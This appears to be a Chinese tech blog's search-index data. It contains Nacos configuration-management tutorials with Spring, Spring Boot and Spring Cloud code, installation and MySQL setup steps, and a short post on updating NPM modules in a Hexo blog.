&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 1.6、配置 dispatcherServlet-servlet.xml1234567&lt;!-- Spring MVC Annotation-Driven --&gt;&lt;mvc:annotation-driven/&gt;&lt;!-- Spring Context Annotation-Driven --&gt;&lt;context:annotation-config/&gt;&lt;context:component-scan base-package="com.nacos.study"/&gt; 1.7、测试应用程序 将 Spring Web 应用部署到 Tomcat 服务器 浏览器访问 http://127.0.0.1:8080/config/get，若响应结果为 true，则说明程序运行正常 Nacos Config Spring Boot 入门案例2.0、版本说明在本案例中，Spring Boot 的版本为 2.0.3.RELEASE，对应的 Nacos Config Spring Boot 的版本为 0.2.7，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 2.1、发布配置12345Namespace: publicData ID: nacos_config_springboot_demo.propertiesGroup: DEFAULT_GROUP配置格式: Properties配置内容: useLocalCache=true 2.2、添加 Maven 依赖特别注意，Nacos Spring Boot Starter 版本 0.2.x.RELEASE 对应的是 Spring Boot 2.x 版本，版本 0.1.x.RELEASE 对应的是 Spring Boot 1.x 版本。 123456789101112131415161718192021222324252627282930313233&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;nacos-config-spring-boot.version&gt;0.2.7&lt;/nacos-config-spring-boot.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-config-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-config-spring-boot-actuator&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.3、创建启动主类使用 @NacosPropertySource 加载了 dataId 为 nacos_config_springboot_demo.properties 的配置集，并开启自动更新 12345678@SpringBootApplication@NacosPropertySource(dataId = "nacos_config_springboot_demo.properties", autoRefreshed = true)public class NacosConfigApplication { public static void main(String[] args) { SpringApplication.run(NacosConfigApplication.class, args); }} 2.4、创建 Controller 测试类通过 Nacos 的 @NacosValue 注解设置属性值 12345678910111213@Controller@RequestMapping("/config")public class ConfigController { @NacosValue(value = "${useLocalCache:false}", autoRefreshed = true) private boolean useLocalCache; @ResponseBody @RequestMapping(value = "/get", method = RequestMethod.GET) public boolean get() { return useLocalCache; }} 2.5、配置 application.properties在 application.properties 中配置 Nacos Server 的地址 1nacos.config.server-addr=127.0.0.1:8848 2.6、测试应用程序 启动 Spring Boot 应用 浏览器访问 http://127.0.0.1:8080/config/get，若响应结果为 true，则说明程序运行正常 Nacos Config Spring Cloud 入门案例3.0、版本说明在本案例中，Spring Cloud 的版本是 Greenwich.SR6，对应的 Spring Boot 版本是 2.1.18.RELEASE，对应的 Nacos Config Spring Cloud 版本为 2.1.3.RELEASE，Nacos 官方版本说明可以看这里，点击下载完整的案例代码。 3.1、发布配置第一步：创建名称为 dev 的命名空间 第二步：在 dev 命名空间下新增两项配置，具体的配置内容如下： 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: service-1.yamlGroup: TEST_GROUP配置格式: YAML配置内容: common: name: service-1-config 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: service-2.yamlGroup: TEST_GROUP配置格式: YAML配置内容: common: name: service-2-config 3.2、创建 Maven 父工程在 Maven 父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体配置如下。特别注意，Nacos Spring Cloud Starter 版本 2.1.x.RELEASE 对应的是 Spring Boot 2.1.x 版本，版本 2.0.x.RELEASE 对应的是 Spring Boot 2.0.x 版本，版本 1.5.x.RELEASE 对应的是 Spring Boot 1.5.x 版本，Nacos 官方版本说明可以看这里。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;nacos-config-spring-cloud.version&gt;2.1.3.RELEASE&lt;/nacos-config-spring-cloud.version&gt;&lt;/properties&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-cloud.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3.3、创建 Service 1 工程创建 Service 1 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-alibaba-nacos-config 依赖 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Service 1 的主启动类 1234567@SpringBootApplicationpublic class Service1Application { public static void main(String[] args) { SpringApplication.run(Service1Application.class, args); }} 创建 Service 1 的 Controller 测试类，添加 Spring Cloud 原生 @RefreshScope 注解来实现配置自动更新，或者手动通过 ConfigurableApplicationContext.getEnvironment().getProperty() 来实时获取最新的配置信息 12345678910111213@RestController@RequestMapping("/config")@RefreshScopepublic class ConfigController { @Value("${common.name}") private String config2; @GetMapping("/get") public String get() { return config2; }} 添加 Service 1 需要的 bootstrap.yml 配置文件到工程中 12345678910111213server: port: 56010spring: application: name: service-1 cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 group: TEST_GROUP #配置分组 file-extension: yaml #由于当前环境对应的profile为空，这里的Data ID的名称就是application的name加上file-extension，即service-1.yaml 3.4、创建 Service 2 工程创建 Service 2 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-alibaba-nacos-config 依赖 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Service 2 的主启动类 1234567@SpringBootApplicationpublic class Service2Application { public static void main(String[] args) { SpringApplication.run(Service2Application.class, args); }} 创建 Service 2 的 Controller 测试类，添加 Spring Cloud 原生 @RefreshScope 注解来实现配置自动更新，或者手动通过 ConfigurableApplicationContext.getEnvironment().getProperty() 来实时获取最新的配置信息 1234567891011121314151617181920@RestController@RequestMapping("/config")public class ConfigController { @Value("${common.name}") private String config2; @Autowired private ConfigurableApplicationContext applicationContext; @GetMapping("/get") private String get() { return config2; } @GetMapping("/getRealTime") private String getRealTime() { return applicationContext.getEnvironment().getProperty("common.name"); }} 添加 Service 2 需要的 bootstrap.yml 配置文件到工程中 12345678910111213server: port: 56011spring: application: name: service-2 cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 group: TEST_GROUP #配置分组 file-extension: yaml #由于当前环境对应的profile为空，这里的Data ID的名称就是application的name加上file-extension，即service-2.yaml 3.5、测试应用程序 分别启动 nacos-service-1、nacos-service-2 应用 浏览器访问 http://127.0.0.1:56010/config/get，若响应结果为 service-1-config，则说明 nacos-service-1 应用运行正常 通过 Nacos 的控制台更改 Data ID 为 service-1.yaml 的配置内容，然后再次访问 http://127.0.0.1:56010/config/get，若响应结果发生了变化，则说明 nacos-service-1 应用可以实时感知到 Nacos Server 的配置变更 参考步骤二和步骤三，测试 nacos-service-2 应用即可 Nacos Config Spring Cloud 常用配置常用的配置参数在上面的 bootstrap.yaml 配置文件中，之所以需要配置 spring.application.name，是因为它是构成 Nacos 配置管理 dataId 字段的一部分，在 Nacos Spring Cloud 中，dataId 的完整格式如下： 1${prefix}-${spring.profiles.active}.${file-extension} group 默认为 DEFAULT_GROUP，可以通过 spring.cloud.nacos.config.group 来配置 prefix 默认为 spring.application.name 的值，也可以通过配置项 spring.cloud.nacos.config.prefix 来配置 namespace 默认为 public 命名空间的 ID，可以通过 spring.cloud.nacos.config.namespace 来配置，这里的值是 Namespace 的 ID file-exetension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置，目前只支持 properties 和 yaml 类型 spring.profiles.active 即为当前环境对应的 profile。特别注意：当 spring.profiles.active 为空时，对应的连接符 - 也将不存在，dataId 的拼接格式会变成 ${prefix}.${file-extension} 完整的配置参数 配置文件加载顺序若项目中同时存在 bootstrap.yaml 和 application.yml 配置文件，那么 Nacos Config Spring Cloud 的配置信息必须写在 bootstrap.yml 配置文件里，因为 Spring Boot 会优先加载 bootstrap.yml 配置文件。值得一提的是，bootstrap.yml 作用于应用程序上下文的引导阶段，bootstrap.yml 由父 Spring ApplicationContext 加载。 自定义 Data ID 配置自定义扩展 Data ID 配置在日常项目开发中，单个微服务可能拥有多个配置文件，对应的就是 Nacos 中的多个 Data ID（配置集），例如包括全局配置、局部配置等（如下图），而上面的案例只能使用配置单一的 Data ID（配置集），无法满足实际的开发需求。但 Nacos Config Spring CLoud 提供了自定义扩展 Data ID 的配置，以此来解决该问题。在以下案例中，首先通过 Nacos 的控制台新增了全局配置（extension-config-01.yaml）与默认配置（extension-config-02.yaml），然后在 bootstrap.yaml 配置文件中通过 extension-configs 标签来配置多个 Data ID（配置集），点击下载完整的案例代码。 使用场景 发布配置 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: extension-config-01.yamlGroup: GLOBAL_GROUP配置格式: YAML配置内容: common: address: 127.0.0.1 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: extension-config-02.yamlGroup: DEFAULT_GROUP配置格式: YAML配置内容: common: threads: 2000 配置示例 值得一提的是，在旧版 Nacos Config Spring Cloud 中，使用的标签是 ext-config，下标都是从零开始，配置示例如下： 12345678910111213141516171819server: port: 56010spring: application: name: service cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 extension-configs[0]: data-id: extension-config-01.yaml group: GLOBAL_GROUP refresh: true extension-configs[1]: data-id: extension-config-02.yaml group: DEFAULT_GROUP refresh: true 通过 spring.cloud.nacos.config.extension-config[n].data-id 的配置方式来支持多个 Data ID 的配置 通过 spring.cloud.nacos.config.extension-config[n].group 的配置方式自定义 Data ID 所在的组，不配置的话，默认是 DEFAULT_GROUP 通过 spring.cloud.nacos.config.extension-config[n].refresh 的配置方式来控制该 Data ID 在配置变更时，是否支持在应用中可动态刷新，感知到最新的配置值，默认是不支持的 多个 Data ID 同时配置时，优先级关系是 spring.cloud.nacos.config.extension-config[n].data-id 其中 n 的值越大，优先级越高 spring.cloud.nacos.config.extension-config[n].data-id 的值必须带文件扩展名，文件扩展名支持 properties、yaml/yml，此时 spring.cloud.nacos.config.file-extension 的配置参数对自定义扩展配置的 Data ID 文件扩展名没有影响 Java 代码 12345678910111213141516@RestController@RequestMapping("/config")@RefreshScopepublic class ConfigController { @Value(("${common.address}")) private String address; @Value("${common.threads}") private String threads; @GetMapping("/get") public String get() { return "address: " + address + " threads: " + threads; }} 自定义共享 Data ID 配置为了更加清晰地在多个应用间配置共享的 Data ID，可以使用 spring.cloud.nacos.config.shared-dataids 标签来定义 Data ID。值得一提的是，在新版的 Nacos Config Spring Cloud 中，使用的标签升级为 spring.cloud.nacos.config.shared-configs。当使用自定义共享 Data ID 配置的方式时，只能读取到配置分组（Group）为 DEFAULT_GROUP 的 Data ID，如果 Data ID 归属于其他非默认的配置分组（DEFAULT_GROUP），则无法读取对应的配置信息，所以自定义共享 Data ID 配置的方式在实际开发中使用频率较低。 配置示例 12345678910111213server: port: 56010spring: application: name: service cloud: nacos: config: server-addr: 127.0.0.1:8848 #配置中心的地址 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #命名空间 shared-dataids: shared-config-01.yaml,shared-config-02.yaml refreshable-dataids: shared-config-01.yaml 通过 spring.cloud.nacos.config.shared-dataids 来支持多个共享 Data ID 的配置，多个之间用逗号隔开 通过 spring.cloud.nacos.config.refreshable-dataids 来支持哪些共享配置的 Data ID 在配置变化时，在应用中是否可动态刷新，感知到最新的配置值，多个 Data ID 之间用逗号隔开。如果没有配置时，默认情况下所有共享配置的 Data ID 都不支持动态刷新 通过 spring.cloud.nacos.config.shared-dataids 来支持多个共享配置的 Data ID 时， 多个共享配置间的优先级关系由配置出现的先后顺序来决定，即后面的优先级要高于前面 通过 spring.cloud.nacos.config.shared-dataids 来配置时，Data ID 必须带文件扩展名，文件扩展名既可支持 properties、yaml/yml，此时 spring.cloud.nacos.config.file-extension 的配置参数对自定义共享配置的 Data ID 文件扩展名没有影响 spring.cloud.nacos.config.refreshable-dataids 配置哪些 Data ID 需要支持动态刷新时，Data ID 的值也必须明确给出文件扩展名 配置加载的优先级新版的 Nacos Config Spring Cloud 目前提供了三种配置能力从 Nacos 拉取相关的配置，具体如下： A: 通过 spring.cloud.nacos.config.shared-configs 支持多个共享 Data ID 的配置 B: 通过 spring.cloud.nacos.config.extension-configs[n].data-id 的方式支持多个扩展 Data ID 的配置 C: 通过内部相关规则（应用名 或者 应用名 + Profile），即 ${prefix}-${spring.profiles.active}.${file-extension} 规则来自动生成相关的 Data ID 配置 当三种方式共同使用时，优先级关系是： A &lt; B &lt; C 完全关闭配置若希望完全关闭 Nacos Config Spring Cloud，可以通过设置 spring.cloud.nacos.config.enabled=false 来关闭。 Nacos Config Spring Cloud 原理浅析自动注入Nacos Config Starter 实现了 org.springframework.cloud.bootstrap.config.PropertySourceLocator 接口，并将优先级设置成了最高。在 Spring Cloud 应用启动阶段，会主动从 Nacos Server 端获取对应的数据，并将获取到的数据转换成 PropertySource 且注入到 Environment 的 PropertySources 属性中，所以使用 @Value 注解也能直接获取 Nacos Server 端配置的内容。 动态刷新Nacos Config Starter 默认为所有获取数据成功的 Nacos 的配置项添加了监听功能，在监听到服务端配置发生变化时会实时触发 org.springframework.cloud.context.refresh.ContextRefresher 的 refresh() 方法 。如果需要对 Bean 进行动态刷新，给类添加 @RefreshScope 或 @ConfigurationProperties 注解即可。 补充内容Endpoint 信息查看Spring Boot 支持这一点，Nacos Config 也可以使用 Endpoint 来暴露信息。在 Maven 中添加 spring-boot-starter-actuator 依赖，并在配置中允许 Endpoints 的访问即可。 Spring Boot 1.x 中添加配置 management.security.enabled=false Spring Boot 2.x 中添加配置 management.endpoints.web.exposure.include=* Spring Boot 1.x 可以通过访问 http://127.0.0.1:18084/nacos_config 来查看 Nacos Endpoint 的信息 Spring Boot 2.x 可以通过访问 http://127.0.0.1:18084/actuator/nacos-config 来查看 Nacos Endpoint 的信息 下篇 - Nacos 入门教程 - 配置管理（高级篇） Nacos 入门教程 - 配置管理高级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Hexo 更新 NPM 模块",url:"/posts/7ffec382.html",text:'系统环境 123NPM：6.4.1NodeJs： v10.15.0Linux： Debian 9（stretch） NPM 更新模块（第一种方法） 假设需要将模块 hexo-site-auth@0.0.3 更新至 hexo-site-auth@0.0.4，可参考以下操作步骤。由于国内下载 NPM 模块的网速很慢，建议使用代理进行下载。注意这里不能使用 CNPM + 淘宝镜像来安装 NPM 模块，具体原因下面会给出解释。 1234567# 进入Hexo的根目录$ cd hexo_blog# 更新NPM模块（与模块的安装操作没有本质区别，只是指定了新的版本号），如果执行失败可尝试删除package-lock.json文件后再更新$ npm install hexo-site-auth@0.0.4 --save# 提示：当安装命令不带具体版本号时，则表示默认安装最新版本的NPM模块 NPM 更新模块（第二种方法） 123456789101112# 进入Hexo的根目录$ cd hexo_blog# 编辑package.json配置文件，更改对应模块的版本号为目标版本号$ vim package.json"hexo-site-auth": "0.0.4"# 安装NPM模块$ npm install# 若安装失败，可以尝试删除NPM的整个模块目录后再安装$ rm -rf node_modules 检查更新模块是否成功 12345678910# 通过Hexo清理Public目录$ hexo clean# 通过Hexo构建静态文件$ hexo generate# 通过Hexo启动服务$ hexo server# 若Hexo的Web服务可以正常启动，则说明NPM模块更新成功 Gulp 压缩图片失败 若上面使用淘宝的 CNPM + 淘宝镜像来安装 NPM 模块，整个安装过程很顺利，但 Gulp 执行图片压缩的时候，可能会出现以下错误。初步判断是 CNPM 安装 gulp-imagemin 模块时出了问题，此时需要先卸载 gulp-imagemin，然后使用 NPM 工具重新安装 gulp-imagemin。 12345remote: (node:2037) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 282)remote: (node:2037) UnhandledPromiseRejectionWarning: Error: spawn /home/git/blog-githooks-build-repo/node_modules/_optipng-bin@5.1.0@optipng-bin/vendor/optipng EACCESremote: at Process.ChildProcess._handle.onexit (internal/child_process.js:232:19)remote: at onErrorNT (internal/child_process.js:407:16)remote: at process._tickCallback (internal/process/next_tick.js:63:19) 12345678910# 进入Hexo的根目录$ cd hexo_blog# 卸载gulp-imagemin$ npm uninstall gulp-imagemin@5.0.3 --save# 安装gulp-imagemin$ npm install gulp-imagemin@5.0.3 --save# 强烈建议直接删除整个node_modules目录，然后使用NPM工具重新安装所有模块 注意事项 package-lock.json 文件不是必要的，如果希望更新该文件，可直接删除文件，然后执行 “npm install” 操作后会自动重新生成该文件 执行 “npm install” 操作后，可以接着执行 “npm audit fix”，但绝对不能再执行 “npm audit fix –force”，否则会强制升级 NPM 模块的版本，导致后续因代码不兼容，出现各种编译错误 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Nacos 入门教程 - 配置管理基础篇",url:"/posts/ab6959cb.html",text:'配置中心介绍什么是配置中心在集中式开发时代，配置文件已经基本足够了，因为那时配置的管理通常不会成为一个很大的问题。但是在互联网时代，应用都是分布式系统，部署在 N 台服务器上，想要去线上一台台地重启机器肯定不靠谱，并且维护成本也很高，所以配置中心应运而生。配置中心被用作集中管理不同环境（Dev、Test、Stage、Prod）和不同集群配置，以及在修改配置后将实时动态推送到应用上进行刷新。配置中心应具备的功能如下： Open API 业务无关性 高可用集群 配置生效监控 配合灰度与更新 一致性 K-V 存储 统一配置实时推送 配置全局恢复、备份与历史 主流配置中心对比 Spring Cloud Config、Netflix Archaius、Apollo、Disconf（已停止维护） 对比图一 Spring Cloud Config、Netflix Archaius、Apollo、Disconf（已停止维护） 对比图二 Nacos 简介Nacos 概述Nacos 是构建以 “服务” 为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施，可以更敏捷和容易地构建、交付和管理微服务平台。Nacos 提供了一组简单易用的特性集，致力于快速实现动态服务发现、服务配置、服务元数据及流量管理。更多资料可参考：Nacos 项目、Nacos 官方示例代码、Nacos 官网、Nacos 官方中文文档 Nacos 功能动态配置服务 动态配置服务能够以中心化、外部化和动态化的方式管理所有环境的配置。动态配置消除了配置变更时重新部署应用和服务的需要。配置中心化管理让实现无状态服务更简单，也让按需弹性扩展服务更容易。 服务发现与服务健康监测 动态服务发现对以服务为中心的（例如微服务和云原生）应用架构方式非常关键。Nacos 支持 DNS-Based 和 RPC-Based（Dubbo、gRPC） 模式的服务发现。Nacos 也提供实时健康检查，以防止将请求发往不健康的主机或服务实例。借助 Nacos，可以更容易地为服务实现断路器。 动态 DNS 服务 通过支持权重路由，动态 DNS 服务能够轻松实现中间层负载均衡、更灵活的路由策略、流量控制以及简单数据中心内网的简单 DNS 解析服务。动态 DNS 服务还能更容易地实现以 DNS 协议为基础的服务发现，以消除耦合到厂商私有服务发现 API 上的风险。 服务及其元数据管理 Nacos 能从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及最首要的 metrics 统计数据。 Nacos 特性易于使用 动态配置管理、服务发现和动态的一站式解决方案 20 多种开箱即用的以服务为中心的架构特性 基本符合生产要求的轻量级易用控制台 生产等级 脱胎于历经阿里巴巴 10 年生产验证的内部产品 支持具有数百万服务的大规模场景 具备企业级 SLA 的开源产品 更适应云架构 无缝支持 Kubernetes 和 Spring Cloud 在主流公共云上更容易部署和运行（例如阿里云和 AWS） 多租户和多环境支持 丰富的应用场景 支持限流、大促销预案和异地多活 直接支持或稍作扩展即可支持大量有用的互联网应用场景 流量调度和服务治理 Nacos 生态图如 Nacos 生态图所示，Nacos 无缝支持一些主流的开源生态，包括 Spring Cloud、Apache Dubbo、Dubbo Mesh、gRPC、Kubernetes 、CNCF 等。 Nacos 安装安装 Nacos安装环境准备Nacos 依赖 Java 环境运行，因此需要提前安装并配置 JDK，如果是从源码开始构建并运行 Nacos，还需要为此配置 Maven 环境，Nacos 依赖的软件环境如下： 64 Bit OS，支持 Unix/Linux/Mac/Windows 64 Bit JDK 1.8+ Maven 3.2.x+ Nacos 1.4.0 通过源码编译安装12345678910111213141516171819202122232425262728# 拉取源码$ git clone git@github.com:alibaba/nacos.git# 进入源码目录$ cd nacos# 编译打包$ mvn -Prelease-nacos clean install -U# 或者指定编译时跳过测试$ mvn -Prelease-nacos clean install -U -f pom.xml -Dmaven.test.skip=true# 进入编译后的bin目录$ cd distribution/target/nacos-server-1.4.0/nacos/bin# 单机模式下启动Nacos服务，默认端口为8848，默认使用内置数据源$ sh startup.sh -m standalone# 查看Nacos的进程状态$ ps -aux|grep nacos# 查看Nacos的端口状态$ netstat -anp|grep 8848# 关闭Nacos服务$ sh shutdown.sh# 提示： Nacos启动的日志文件路径为： nacos/distribution/target/nacos-server-1.4.0/nacos/logs/start.out 通过下载二进制包安装Nacos 下载地址点这里，下载后解压即可运行。 12345678910111213141516171819# 解压$ tar -xvf nacos-server-1.4.0.tar.gz# 进入bin目录$ cd nacos/bin# 单机模式下启动Nacos服务，默认端口为8848，默认使用内置数据源$ sh startup.sh -m standalone# 查看Nacos的进程状态$ ps -aux|grep nacos# 查看Nacos的端口状态$ netstat -anp|grep 8848# 关闭Nacos服务$ sh shutdown.sh# 提示： Nacos启动的日志文件路径为： nacos/logs/start.out 访问 Nacos 的 Web 控制台浏览器访问 http://127.0.0.1:8848/nacos，默认登录的用户名和密码为 nacos/nacos。 Open API 配置管理测试Nacos 启动成功后，可通过 Nacos 提供的 HTTP API 验证 Nacos 服务运行是否正常。 123# 新增配置信息到Nacos$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld"true 刷新 Nacos 的 Web 控制台，可以看到刚新增的配置信息如下： 123# 从Nacos获取配置信息$ curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test"HelloWorld 外部 MySQL 数据库支持（持久化配置）单机模式下 Nacos 默认使用嵌入式数据库 derby 来存储数据，若想使用外部 MySQL 数据库存储 Nacos 的数据，需要进行以下操作： 安装 MySQL 5.6.5+ 下载 Nacos Server 的二进制安装包并解压 创建数据库 nacos_config，执行 SQL 初始化脚本，数据库初始化脚本的路径为：${nacos-home}/conf/nacos-mysql.sql 12345678910111213141516171819202122232425262728# 创建数据库mysql&gt; create database nacos_config default character set utf8;# 切换数据库mysql&gt; use nacos_config;# 执行SQL初始化脚本mysql&gt; source ${nacos-home}/conf/nacos-mysql.sql;# 查看数据库表mysql&gt; show tables;+------------------------+| Tables_in_nacos_config |+------------------------+| config_info || config_info_aggr || config_info_beta || config_info_tag || config_tags_relation || group_capacity || his_config_info || permissions || roles || tenant_capacity || tenant_info || users |+------------------------+12 rows in set (0.00 sec) 修改 ${nacos-home}/conf/application.properties 配置文件，增加支持 MySQL 数据源的配置信息（目前只支持 MySQL），并添加 MySQL 数据库的 URL、用户名、密码，最后重新启动 Nacos 服务即可，配置示例如下： 123456spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://127.0.0.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=123456 若希望使用 Nacos Server 内置的数据源（嵌入式数据库），可以使用 -p embedded 参数来启动 Nacos Server 1sh startup.sh -p embedded Nacos 配置入门案例第一步：点击新增配置按钮浏览器访问 http://127.0.0.1:8848/nacos，打开 Nacos 的 Web 控制台，并找到菜单 配置管理 &gt; 配置列表，然后点击 新增 按钮： 第二步：新增配置信息在新增配置信息的表单里，填写如下的内容，然后点击 发布 按钮即可。特别注意的是，DataId 默认是以 properties 作为默认的文件扩展名。 第三步：查询配置信息 第四步：调用 Java API 获取 Nacos 的配置信息12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt; 1234567891011121314151617181920212223import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.exception.NacosException;import java.util.Properties;/** * 从Nacos读取配置信息 * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException { String serverAddr = "127.0.0.1:8848"; String dataId = "nacos_simple_demo.yaml"; String group = "DEFAULT_GROUP"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); }} 程序运行输出结果如下： 12common: config: something Nacos 配置管理基础Nacos 配置管理模型对于 Nacos 配置管理，通过 Namespace、group、Data ID 能够定位到一个配置集。 配置项 配置集中包含的一个个配置内容就是配置项。它代表一个具体的可配置的参数与其值域，通常以 key=value 的形式存在。例如经常配置系统的日志输出级别（logLevel=INFO|WARN|ERROR） 就是一个配置项。 配置集（Data ID） 在系统中，一个配置文件通常就是一个配置集，一个配置集可以包含了系统的各种配置信息，例如一个配置集可能包含了数据源、线程池、日志级别等配置项。每个配置集都可以定义一个有意义的名称，就是配置集的 ID，即 Data ID。 配置分组（Group） 配置分组是对配置集进行分组，通过一个有意义的字符串（如 Buy 或 Trade ）来表示，不同的配置分组下可以有相同的配置集（Data ID）。当在 Nacos 上创建一个配置时，如果未填写配置分组的名称，则配置分组的名称默认采用 DEFAULT_GROUP。配置分组的常见场景：可用于区分不同的项目或应用，例如：学生管理系统的配置集可以定义一个 Group 为：STUDENT_GROUP。 命名空间（Namespace） 